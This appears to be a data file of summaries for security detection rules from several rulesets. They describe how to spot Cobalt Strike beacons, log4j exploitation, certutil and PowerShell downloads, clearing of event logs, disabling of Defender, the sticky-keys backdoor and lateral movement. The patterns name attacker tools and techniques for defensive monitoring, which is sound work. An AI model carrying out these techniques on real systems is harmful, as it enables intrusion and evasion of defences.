0d18728b-f5bf-4381-9dcf-915539fff6c2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1593e17d4bd6db1873d072ddf1a5557b
  Ruleset: core
  Summary: This rule detects a program that invoked suspicious DNS queries associated
    with Cobalt Strike beacons. Cobalt Strike is a legitimate post-exploitation tool
    used by security professionals, but it is frequently exploited by cybercriminals
    for command-and-control activities. The rule focuses on DNS Client EventID 3008
    and monitors for DNS queries that start with specific patterns such as 'aaa.stage.'
    and 'post.1' or contain the substring '.stage.123456.' These patterns have been
    observed in Cobalt Strike beaconing activities, indicating possible malware communication
    or data exfiltration attempts.
  Updated-Date: '2024_09_03'
0d2c3d4c-4b48-4ac3-8f23-ea845746bb1a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a5723307626b2e72cc146d26a3d3ac1e
  Ruleset: sigmahq
  Summary: This rule detects suspicious Ruby on Rails exceptions that could indicate
    exploitation attempts within a web application. The specific exceptions monitored
    include `ActionController::InvalidAuthenticityToken`, `ActionController::InvalidCrossOriginRequest`,
    `ActionController::MethodNotAllowed`, `ActionController::BadRequest`, and `ActionController::ParameterMissing`.
    These exceptions in the Ruby on Rails framework may suggest potential unauthorized
    access or misuse of the application, highlighting security vulnerabilities that
    could be exploited.
  Updated-Date: '2024_09_04'
0d34ed8b-1c12-4ff2-828c-16fc860b766d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a8662b516084c5ba8951c6d7e666ecb
  Ruleset: sigmahq
  Summary: This rule detects suspicious processes spawned by `java.exe`, which could
    indicate exploitation activities such as those related to the log4j vulnerability.
    The detection criteria focus on identifying processes like `AppVLP.exe`, `bitsadmin.exe`,
    `certutil.exe`, `cscript.exe`, `curl.exe`, and various others that, if executed
    by `java.exe`, might suggest malicious behavior. Possible false positives include
    legitimate calls to system binaries and company-specific internal usage.
  Updated-Date: '2024_09_04'
0d5675be-bc88-4172-86d3-1e96a4476536:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8aad0b5a916ec40465d0edab8e14a351
  Ruleset: core
  Summary: This rule detects the execution of "reg.exe" which is used to enable or
    disable the Remote Desktop Protocol (RDP) service by modifying the registry keys
    located under 'CurrentControlSet\Control\Terminal Server'. These changes are indicative
    of attempts to tamper with RDP-related settings, and could signify potential defense
    evasion or lateral movement activities often associated with malicious behavior,
    such as those employed by malware like Qbot. Specific command line patterns and
    registry values involved in the manipulation serve as indicators for this detection
    rule.
  Updated-Date: '2024_09_03'
0d7a9363-af70-4e7b-a3b7-1a176b7fbe84:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: baf691622b3fe073105dd81290e6b42f
  Ruleset: core
  Summary: This rule detects the use of `regedit.exe` to export a Windows Registry
    key and conceal it within an alternate data stream. This technique can be employed
    for evasion purposes, making it challenging to identify the exported Registry
    data through standard file listing methods.
  Updated-Date: '2024_09_03'
0d7ceeef-3539-4392-8953-3dc664912714:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fc8c5854ac5754f9e802b24e80c7c03c
  Ruleset: sigmahq
  Summary: This rule detects attempts to alter the User Account Control (UAC) elevation
    request destination by modifying the "PromptOnSecureDesktop" value in the Windows
    registry. The "PromptOnSecureDesktop" setting determines if UAC prompts appear
    on a secure desktop, which isolates the prompts from other system processes to
    prevent tampering. If this setting is changed to 0, UAC prompts are displayed
    on the user's current desktop, reducing security as it opens the possibility for
    the prompts to be manipulated by malicious software.
  Updated-Date: '2024_09_04'
0dba975d-a193-4ed1-a067-424df57570d1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9b58cb696d93ff5fe41c33e9eb708f10
  Ruleset: core
  Summary: This rule detects any network connection initiated by the utility certutil.exe
    on a Windows system. Certutil.exe is a command-line program used primarily for
    certificate services, but attackers may exploit it to download malware or additional
    malicious payloads. The rule specifically monitors connections on ports 80, 135,
    443, and 445.
  Updated-Date: '2024_09_03'
0ddcff6d-d262-40b0-804b-80eb592de8e3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2fc31a2f71163dcf61780aa56494f95d
  Ruleset: sigmahq
  Summary: This rule detects when a service principal is created in Azure. A service
    principal is an identity used by applications or automated tools to access Azure
    resources. Monitoring for the creation of service principals is important because
    it can indicate the establishment of a new method for accessing and interacting
    with Azure services, which can be exploited for unauthorized actions if not properly
    managed. Detection focuses on specific activity logs indicating the addition of
    a service principal, and it is essential to verify the legitimacy of such activity
    to avoid potential misuse or unauthorized access.
  Updated-Date: '2024_09_04'
0e0255bf-2548-47b8-9582-c0955c9283f5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b14ebd567a65c330f27b29d04147cc08
  Ruleset: core
  Summary: This rule detects suspicious additions to BitLocker-related registry keys
    using the reg.exe utility. Specifically, it monitors for commands that add configurations
    to the \SOFTWARE\Policies\Microsoft\FVE path with parameters such as EnableBDEWithNoTPM,
    UseAdvancedStartup, UseTPM, UseTPMKey, UseTPMKeyPIN, RecoveryKeyMessageSource,
    UseTPMPIN, and RecoveryKeyMessage. The detection of these commands may indicate
    an attempt to alter BitLocker's behavior potentially for malicious purposes.
  Updated-Date: '2024_09_03'
0e0bc253-07ed-43f1-816d-e1b220fe8971:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5c23edda18edccec23d3220de8ae2d64
  Ruleset: core
  Summary: This rule detects potential DLL sideloading involving the "RjvPlatform.dll"
    file by the "SystemResetPlatform.exe" executable when it is located in a non-default
    location on a Windows system.
  Updated-Date: '2024_09_03'
0e1ebc5a-15d0-4bf6-8199-b2535397433a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e1616256297a8468760f66a8d9eb953b
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2023-23752, which
    involves improper access checks in web service endpoints in Joomla. It looks for
    suspicious GET requests in web server logs that contain specific query patterns
    indicating that public access has been improperly granted. This activity mirrors
    attacks aiming for initial access via a known vulnerability.
  Updated-Date: '2024_09_03'
0e20c89d-2264-44ae-8238-aeeaba609ece:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8a200e466f822cd9651f2dd758922e5c
  Ruleset: core
  Summary: This rule detects the creation of Microsoft Office files within the default
    startup folders, indicating an attempt to establish persistence on a system. The
    focus is on files associated with Microsoft Word and Excel, particularly those
    with extensions like .doc, .docm, .docx, .dot, .dotm, .rtf for Word and .xls,
    .xlsm, .xlsx, .xlt, .xltm for Excel. It examines paths commonly used by these
    applications such as '\Microsoft\Word\STARTUP', '\Office\Program Files\STARTUP',
    and '\Microsoft\Excel\XLSTART'. This detection helps identify potentially unauthorized
    and malicious activities aimed at maintaining persistent access to a Windows environment.
  Updated-Date: '2024_09_03'
0e29e3a7-1ad8-40aa-b691-9f82ecd33d66:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 04a8199e340cc2ff91e9d96034df931a
  Ruleset: sigmahq
  Summary: This rule detects the creation of new Office macro files on systems through
    applications such as browsers and mail clients. It focuses on processes associated
    with common email clients like RuntimeBroker, Outlook, and Thunderbird, as well
    as various web browsers including Chrome, Firefox, Safari, and Edge. The rule
    identifies macro files with extensions such as .docm, .dotm, .xlsm, .xltm, .potm,
    and .pptm, including those with 'Zone' tags in their filenames. While the detection
    aims to identify potentially malicious activities, legitimate downloads or email
    attachments containing macro files could trigger false positives.
  Updated-Date: '2024_09_04'
0e7163d4-9e19-4fa7-9be6-000c61aad77a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 30d7eb3c66561387840c3020d0126e17
  Ruleset: core
  Summary: This rule detects the creation of named pipes that match specific patterns
    associated with CobaltStrike Malleable C2 profiles, which are often used in cyber
    attack scenarios for command and control purposes. These patterns are identified
    through regular expressions and include named pipes such as '\\mojo\.5688\.8052\.(?:183894939787088877|35780273329370473)[0-9a-f]{2}',
    '\\wkssvc_?[0-9a-f]{2}', and several others. Monitoring for these indicators can
    help identify potential malicious activity related to CobaltStrike, a popular
    penetration testing tool and post-exploitation agent often leveraged by attackers
    for stealth operations and persistence.
  Updated-Date: '2024_09_03'
0e8cfe08-02c9-4815-a2f8-0d157b7ed33e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 50950557f2507e54ca64e9216f5cf88a
  Ruleset: core
  Summary: This rule detects the execution of Chromium-based browsers in headless
    mode using the "dump-dom" command line to download files. It specifically monitors
    processes involving browsers such as Brave, Chrome, Edge, Opera, and Vivaldi that
    use parameters indicating headless operation and attempting to dump the Document
    Object Model (DOM). This behavior is often associated with unauthorized file downloads,
    making it a potential indicator of a command-and-control attack.
  Updated-Date: '2024_09_03'
0e9e6c63-1350-48c4-9fa1-7ccb235edc68:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75006e419ac24dd64cbc44cec0a28357
  Ruleset: emerging-threats
  Summary: This rule detects the execution activity of Rorschach ransomware on Windows
    systems by monitoring the creation of specific processes. It identifies the ransomware
    based on the use of particular executables such as `bcdedit.exe`, `net.exe`, `net1.exe`,
    `netsh.exe`, `wevtutil.exe`, and `vssadmin.exe`, along with a specific command
    line pattern containing '11111111'. This monitoring helps in identifying and mitigating
    a sophisticated and fast-moving ransomware threat.
  Updated-Date: '2024_09_03'
0ea52357-cd59-4340-9981-c46c7e900428:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bb545e4cb0ba7c9669ee5fb5a6241b27
  Ruleset: sigmahq
  Summary: This rule detects the execution of `rundll32.exe` using the `oledb32.dll`
    library to open a UDL file. Threat actors can abuse this technique as a phishing
    vector to capture authentication credentials or other sensitive data. The rule
    triggers when `rundll32.exe` is run with specific command-line options, including
    `oledb32.dll` and `,OpenDSLFile`, and targets user download directories. This
    action can be indicative of an attempt to exploit database connection functionalities
    maliciously.
  Updated-Date: '2024_09_04'
0eb46774-f1ab-4a74-8238-1155855f2263:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ac2fc0343720805f28558c92fc5a39fa
  Ruleset: core
  Summary: This rule detects attempts to disable various functionalities of Windows
    Defender via specific Windows registry keys. The rule identifies modifications
    to registry paths associated with Windows Defender and its real-time protection
    settings, including disabling antivirus, antispyware, behavior monitoring, and
    script scanning protections. It also tracks changes to settings related to tamper
    protection, exploit protection, and sample submission consent. The rule incorporates
    filters to disregard changes made by Symantec Endpoint Protection to avoid false
    positives. Potential false positives could arise from legitimate administrator
    actions performed through the Windows Defender interface or the presence of third-party
    antivirus software.
  Updated-Date: '2024_09_03'
0ed75b9c-c73b-424d-9e7d-496cd565fbe0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c902977b6c8014361ecb7ac289d438fb
  Ruleset: sigmahq
  Summary: This rule detects the use of the 'grep' command to discover the presence
    of various security software on macOS systems. It looks for command-line invocations
    targeting specific security-related processes, such as 'nessusd' for the Nessus
    vulnerability scanner, 'santad' from Google Santa, 'CbDefense' for Carbon Black,
    'falcond' for CrowdStrike Falcon, 'td-agent' for Fluentd log shipper, several
    Elastic agents like 'packetbeat,' 'filebeat,' and 'auditbeat,' 'osqueryd' from
    Facebook Osquery, 'BlockBlock' which monitors and blocks persistence locations
    from Objective-See, and 'LuLu' for firewall management from Objective-See. It
    also identifies mentions of 'Little Snitch,' a firewall management utility from
    Objective Development Software. This detection can highlight potentially unauthorized
    attempts to inventory installed security software, which could indicate malicious
    reconnaissance activities.
  Updated-Date: '2024_09_04'
0ee4d8a5-4e67-4faf-acfa-62a78457d1f2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 51ae9530114ca659bd6c97f7b41e7d9d
  Ruleset: core
  Summary: This rule detects the installation of the Hybrid Connection Manager service
    on Windows operating systems by monitoring for Event ID 4697 in the security logs.
    The presence of "HybridConnectionManager" in the service name or service file
    name triggers the detection. Hybrid Connection Manager is related to Azure function
    apps, providing persistent hybrid connectivity.
  Updated-Date: '2024_09_03'
0f017df3-8f5a-414f-ad6b-24aff1128278:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1f1088cb0a6cc591aac526fdb6ec9eb6
  Ruleset: sigmahq
  Summary: This rule detects the use of specific PowerShell cmdlets such as "Clear-EventLog,"
    "Remove-EventLog," "Limit-EventLog," and "Clear-WinEvent" that are employed to
    clear Windows event logs. These actions can be indicative of attempts to cover
    tracks or evade detection. The rule highlights that while there are legitimate
    reasons for clearing logs, such as during certain installations or maintenance
    scripts, any instance should be investigated to verify its legitimacy.
  Updated-Date: '2024_09_04'
0f0450f3-8b47-441e-a31b-15a91dc243e2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 18c71de61b52552d7f3eed5c062701c3
  Ruleset: sigmahq
  Summary: This rule detects potential DLL files being downloaded using the PowerShell
    Invoke-WebRequest cmdlet. It identifies the execution of PowerShell commands that
    include "Invoke-WebRequest" or its alias "IWR," along with parameters indicating
    a DLL file download, specifically URLs containing "http" and outputting to a file
    with a ".dll" extension. This behavior may indicate an attempt to retrieve malicious
    DLL files for execution on a Windows system, posing a threat associated with command-and-control
    and execution tactics commonly used by attackers.
  Updated-Date: '2024_09_04'
0f06a3a5-6a09-413f-8743-e6cf35561297:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7b1a524d64fcbba4f3fe3900c24d44e3
  Ruleset: sigmahq
  Summary: This rule detects the creation of WMI event subscriptions, which is a persistence
    method often used by attackers to maintain access on a compromised Windows system.
    The rule identifies specific event IDs (19, 20, and 21) associated with WMI event
    filter, event consumer, and event consumer to filter activity, respectively. This
    technique can allow cyber adversaries to execute code or scripts in response to
    specific system events, ensuring their malicious activities continue even after
    reboots.
  Updated-Date: '2024_09_04'
0f16d9cf-0616-45c8-8fad-becc11b5a41c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 76295844f0b174876a8284050f5d0d9b
  Ruleset: sigmahq
  Summary: This rule detects the execution of a renamed AutoHotkey executable by analyzing
    the Portable Executable (PE) metadata fields. It identifies instances where the
    'Product' and 'Description' fields include 'AutoHotkey', and the 'OriginalFileName'
    matches known AutoHotkey filenames. The rule filters out known AutoHotkey executable
    file paths to avoid false positives, thus focusing on cases where the executable
    may have been renamed or relocated to evade detection.
  Updated-Date: '2024_09_04'
0f2468a2-5055-4212-a368-7321198ee706:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5e36516d6a6acbeb1c488762b5de0d26
  Ruleset: sigmahq
  Summary: This rule detects activity occurring from a country that is infrequently
    visited or never visited by any user within an organization, as reported by Microsoft
    Cloud App Security. The detection focuses on events in the Security Compliance
    Center with a specific event name indicating such irregular international activity.
    This helps identify potential command-and-control attacks and anomalies that could
    signify security threats.
  Updated-Date: '2024_09_04'
0f3a9db2-c17a-480e-a723-d1f1c547ab6a:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 06486edde1a8cdabf40b59cc0e2d9d40
  Ruleset: emerging-threats
  Summary: This rule detects the potential sideloading of a malicious "aclui.dll"
    by OleView.exe, a behavior observed in variants of the Raspberry Robin malware.
    This activity was reported in February 2024 by Check Point Research. Raspberry
    Robin is known for employing DLL sideloading techniques to evade detection and
    escalate privileges. The rule specifically monitors for instances where OleView.exe
    loads "aclui.dll" from non-legitimate paths, excluding known, signed, and expected
    locations.
  Updated-Date: '2024_09_03'
0f6da907-5854-4be6-859a-e9958747b0aa:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b6375cc2019d3975c5be63a9be62ace9
  Ruleset: sigmahq
  Summary: This rule detects the execution of "AccCheckConsole," a command-line tool
    used for verifying the accessibility implementation of an application's user interface
    (UI). This tool can run tests known as "verification routines" to examine aspects
    such as consistency and navigation within the UI. It allows users to provide a
    DLL containing a custom "verification routine," which could be exploited by attackers
    to load malicious DLLs via the command-line interface (CLI) within the context
    of the "AccCheckConsole" utility.
  Updated-Date: '2024_09_04'
0f79c4d2-4e1f-4683-9c36-b5469a665e06:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c9d4481c6cbe03aff73f3bd82b1544ae
  Ruleset: sigmahq
  Summary: This rule detects the execution of commands used to read the contents of
    the `/etc/sudoers` file on a Linux system. The `/etc/sudoers` file contains information
    on users who have sudo rights, which allows them to execute commands with administrative
    privileges. It monitors process creation events where the command line includes
    references to `/etc/sudoers` and uses utilities such as `cat`, `grep`, `head`,
    `tail`, or `more`. The rule helps identify both potential reconnaissance activity
    and valid administrative activities.
  Updated-Date: '2024_09_04'
0f9c21f1-6a73-4b0e-9809-cb562cb8d981:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 22cd4aa7261c2293267ec0a9bab6b807
  Ruleset: core
  Summary: "This rule detects modifications in the services configuration within the\
    \ Windows registry\u2014specifically changes to the ImagePath, FailureCommand,\
    \ and ServiceDLL entries\u2014executed by processes with a Medium integrity level.\
    \ This kind of activity can indicate attempts to escalate privileges by exploiting\
    \ service permissions weaknesses, a common tactic for attackers to gain elevated\
    \ access on the system."
  Updated-Date: '2024_09_03'
0fa66f66-e3f6-4a9c-93f8-4f2610b00171:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e741f5981775992ec6650bc2f65669be
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "coregen.exe" binary, which is part
    of the Microsoft CoreCLR Native Image Generator, for potentially sideloading arbitrary
    DLLs. It identifies instances where coregen.exe is executed from locations other
    than typical legitimate paths such as those associated with Microsoft Silverlight
    or the Windows System directories, indicating a potential defense evasion technique
    or malicious activity.
  Updated-Date: '2024_09_04'
0fadd880-6af3-4610-b1e5-008dc3a11b8a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b00687627cdcad98a5e978d02242c566
  Ruleset: core
  Summary: This rule detects warning messages generated by the "bpf_probe_write_user"
    BPF helper, which could indicate suspicious eBPF activity within a Linux system.
    The presence of these messages may suggest attempts at persistence or defense
    evasion by potentially malicious actors.
  Updated-Date: '2024_09_03'
0fc35fc3-efe6-4898-8a37-0b233339524f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5afe6fb633ac30075c5c1e4821a36078
  Ruleset: sigmahq
  Summary: This rule detects suspicious changes to screensaver settings using the
    `reg.exe` utility, which could be an indication of adversaries attempting to establish
    persistence by configuring malicious content to be triggered during user inactivity.
    It specifically monitors for changes to registry values such as `ScreenSaveActive`,
    `ScreenSaveTimeout`, `ScreenSaverIsSecure`, and `SCRNSAVE.EXE` within the `HKEY_CURRENT_USER\Control
    Panel\Desktop` registry path, which control the behavior of screensavers on Windows
    systems. These values are typically associated with screensaver activation, timeout
    duration, security settings, and the executable file for the screensaver, respectively.
    Detecting such modifications can help identify potentially harmful activities
    aimed at executing malicious programs disguised as screensavers.
  Updated-Date: '2024_09_04'
0fcd1c79-4eeb-4746-aba9-1b458f7a79cb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 27685ec202b0237fa156ba6754016b58
  Ruleset: core
  Summary: This rule detects remote RPC calls intended to create or execute a scheduled
    task via the ATSvc service, which could indicate lateral movement attempts within
    a network. It monitors for specific event logs generated by the RPC Firewall,
    focusing on the relevant interface UUID and operation numbers associated with
    these remote scheduling actions.
  Updated-Date: '2024_09_03'
10018e73-06ec-46ec-8107-9172f1e04ff2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6175de839e794987028d4aa6cf66ba9a
  Ruleset: core
  Summary: This rule detects remote RPC calls that may be abusing the remote encryption
    service via MS-EFSR for lateral movement. It specifically monitors event logs
    generated by the RPC Firewall with EventID 3 and InterfaceUuid 367abb81-9844-35f1-ad32-98f038001003.
    The rule aims to identify suspicious activities that could indicate an attempt
    to compromise remote servers through misuse of the encryption service. While it
    is effective in detecting potential threats, false positives may occur during
    legitimate administrative tasks on remote services.
  Updated-Date: '2024_09_03'
100ef69e-3327-481c-8e5c-6d80d9507556:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 670f67c5430c0c16c57b2f1370152152
  Ruleset: sigmahq
  Summary: This rule detects the clearing of core Windows Eventlogs, which can occur
    through the execution of commands like "wevtutil cl." The relevant event is identified
    by Event ID 104 from the 'Microsoft-Windows-Eventlog' provider, specifically targeting
    logs such as 'Microsoft-Windows-PowerShell/Operational,' 'Microsoft-Windows-Sysmon/Operational,'
    'PowerShellCore/Operational,' 'Security,' 'System,' and 'Windows PowerShell.'
    Instances where logs might be cleared legitimately include the rollout of log
    collection agents or system provisioning prior to creating a golden image.
  Updated-Date: '2024_09_04'
1012f107-b8f1-4271-af30-5aed2de89b39:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2dca3c1bd29792b22f9393501a91c7a2
  Ruleset: core
  Summary: This rule detects processes spawned by the terminal service server process,
    which could indicate the exploitation of the CVE-2019-0708 vulnerability. The
    process creation logs are scrutinized for parent command lines containing "\svchost.exe"
    and "termsvcs," while excluding legitimate processes typically found in the system,
    such as "rdpclip.exe," "csrss.exe," "wininit.exe," and "winlogon.exe." Detection
    of such activity can signal a potential initial access or lateral movement attack
    vector, making it critical to monitor and address any identified threat.
  Updated-Date: '2024_09_03'
10152a7b-b566-438f-a33c-390b607d1c8d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1dfab88b00b8a3697ea71deaccb5e46
  Ruleset: emerging-threats
  Summary: This rule detects potential activity associated with the EmpireMonkey Advanced
    Persistent Threat (APT), often linked to the cybercrime group FIN7. The detection
    focuses on processes in Windows where the command line includes specific patterns
    such as '/e:jscript' and the path '\Local\Temp\Errors.bat'. These indicators suggest
    the possible execution of malicious scripts aimed at evading defenses.
  Updated-Date: '2024_09_03'
1027d292-dd87-4a1a-8701-2abe04d7783c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a647216666abb68e6e4034aed127c606
  Ruleset: sigmahq
  Summary: This rule detects the creation of the "PSScriptPolicyTest" PowerShell script
    by an uncommon process. The "PSScriptPolicyTest" file is usually generated by
    Microsoft PowerShell to test against AppLocker. This rule specifies that the detection
    is based on the target filename containing "__PSScriptPolicyTest_". It filters
    out common and legitimate processes that typically create this file, such as various
    instances of PowerShell, dsac.exe, sdiagnhost.exe, ServerManager.exe, and wsmprovhost.exe.
    Any creation of the file by processes other than these common ones triggers the
    detection.
  Updated-Date: '2024_09_04'
102e11e3-2db5-4c9e-bc26-357d42585d21:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7105aac859dd96bbe2a256b90ea752e7
  Ruleset: core
  Summary: This rule detects instances when a user is removed from a privileged role
    in Azure. It is intended to identify bulk changes to account permissions, which
    may require investigation. The alert focuses on audit logs indicating the removal
    of eligible members, either permanently or temporarily, from privileged roles.
    Legitimate administrative actions may cause false positives.
  Updated-Date: '2024_09_03'
10344bb3-7f65-46c2-b915-2d00d47be5b0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fa14234c3fbfb142738a719d7a0e9029
  Ruleset: core
  Summary: This rule detects changes to Internet Explorer's (IE) ZoneMap configuration
    settings for the "HTTP" and "HTTPS" protocols via the command line interface.
    Specifically, it identifies when these protocols are downgraded to the "My Computer"
    zone, which can result in downloaded files from the Internet being granted the
    same level of trust as files stored locally. This could potentially expose the
    system to security risks.
  Updated-Date: '2024_09_03'
104cdb48-a7a8-4ca7-a453-32942c6e5dcb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e41b6ce87c24dc941bbde2a517eef593
  Ruleset: sigmahq
  Summary: This rule detects the usage of "ProtocolHandler.exe" to download files
    over FTP, HTTP, or HTTPS. The downloaded files are typically located in the cache
    folder, such as %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE.
  Updated-Date: '2024_09_04'
106d7cbd-80ff-4985-b682-a7043e5acb72:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c24995ae0a88fc46119004cbcbbfa137
  Ruleset: core
  Summary: This rule detects the loading of kernel modules using the insmod command.
    Loadable Kernel Modules (LKMs) are segments of code that can be dynamically added
    and removed from the kernel as needed. Adversaries may utilize LKMs to achieve
    persistence within a system or to escalate their privileges.
  Updated-Date: '2024_09_03'
1070db9a-3e5d-412e-8e7b-7183b616e1b3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6e490880e6b627f4b8b65f4cb1dc1c16
  Ruleset: core
  Summary: This rule detects the modification of the sticky keys executable in a Windows
    environment to enable unauthorized access to a privileged command prompt. By replacing
    the sticky keys executable (sethc.exe) with the command prompt executable (cmd.exe),
    an attacker can trigger a privileged shell when sticky keys are activated, bypassing
    system authentication.
  Updated-Date: '2024_09_03'
10b97915-ec8d-455f-a815-9a78926585f6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 59673e8253ee9f621b89ec8b1942c500
  Ruleset: sigmahq
  Summary: This rule detects the creation, deletion, patching, replacement, or updating
    of Kubernetes Rolebindings or ClusterRolebindings. Monitoring these actions is
    essential as unauthorized changes could indicate attempts at privilege escalation.
    These rolebindings are part of Kubernetes' RBAC (Role-Based Access Control) system,
    which manages permissions within the cluster. Such modifications might be legitimate
    administrative tasks or automated processes, but they warrant scrutiny due to
    their potential impact on security.
  Updated-Date: '2024_09_04'
10c14723-61c7-4c75-92ca-9af245723ad2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7d0a9339f7446318542d077e85dc5063
  Ruleset: core
  Summary: This rule detects potential lateral movement activity using tools from
    the Impacket framework, such as wmiexec, dcomexec, atexec, and smbexec. These
    tools enable remote command execution and interaction with Windows systems by
    leveraging various Windows services and protocols. The rule identifies specific
    patterns in process creation events where parent processes like wmiprvse.exe,
    mmc.exe, explorer.exe, and services.exe execute command-line instructions through
    cmd.exe with indicators such as specific flags and redirection to network shares
    or temporary files.
  Updated-Date: '2024_09_03'
10cb6535-b31d-4512-9962-513dcbc42cc1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d7609ca353a9d3862b3d85431478f28a
  Ruleset: sigmahq
  Summary: This rule detects the loading of drivers associated with the System Informer
    tool. System Informer is a system information and monitoring tool available through
    platforms like SourceForge and GitHub. The detection is particularly focused on
    identifying the presence of specific driver files such as 'SystemInformer.sys'
    and their associated SHA256 hashes, which include multiple known hash values.
    By monitoring these indicators, the rule aims to identify potential instances
    of privilege escalation linked with the use of this tool.
  Updated-Date: '2024_09_04'
10fb649c-3600-4d37-b1e6-56ea90bb7e09:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dd5b335d465062c01f350c06c2f00943
  Ruleset: core
  Summary: This rule detects the addition of users to highly privileged groups on
    Windows systems through specific command-line activities. It monitors for the
    execution of "net.exe" with parameters indicating the addition of a user to a
    local group or "powershell.exe" commands utilizing "Add-LocalGroupMember" with
    group-related parameters. The targeted privileged groups include "Group Policy
    Creator Owners" and "Schema Admins". The intention is to identify potentially
    unauthorized or malicious attempts to grant users elevated privileges, which is
    crucial for maintaining security and preventing persistent threats.
  Updated-Date: '2024_09_03'
1114e048-b69c-4f41-bc20-657245ae6e3f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c2f93a6dbb03bf8006ce9ed50c62300
  Ruleset: sigmahq
  Summary: This rule detects the use of the Get-ADUser cmdlet in PowerShell to gather
    Active Directory user information and export it to a file. This action is often
    indicative of discovery activities, where an actor collects user details possibly
    for later malicious use. The detection focuses on the execution of PowerShell
    commands that include parameters for filtering and outputting user data, observing
    both PowerShell executable names and command lines that redirect the output to
    a file or select specific data fields. Legitimate administrative scripts may also
    exhibit similar behavior, so it is recommended to exclude known, frequent users
    or systems to reduce false positives.
  Updated-Date: '2024_09_04'
1139d2e2-84b1-4226-b445-354492eba8ba:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cba6c568ad6e49e7e4107a79933de9a0
  Ruleset: sigmahq
  Summary: This rule detects the use of various web request commands executed through
    command line tools and Windows PowerShell cmdlets via PowerShell scriptblock logs.
    It identifies specific actions such as creating web requests, using commands like
    `curl`, `Invoke-RestMethod`, `Invoke-WebRequest`, `iwr`, `wget`, `Net.WebClient`,
    and transfer commands like `Resume-BitsTransfer` and `Start-BitsTransfer`. These
    commands may be indicators of downloading files or invoking web requests, commonly
    used by administrators as well as by malicious actors to execute scripts or transfer
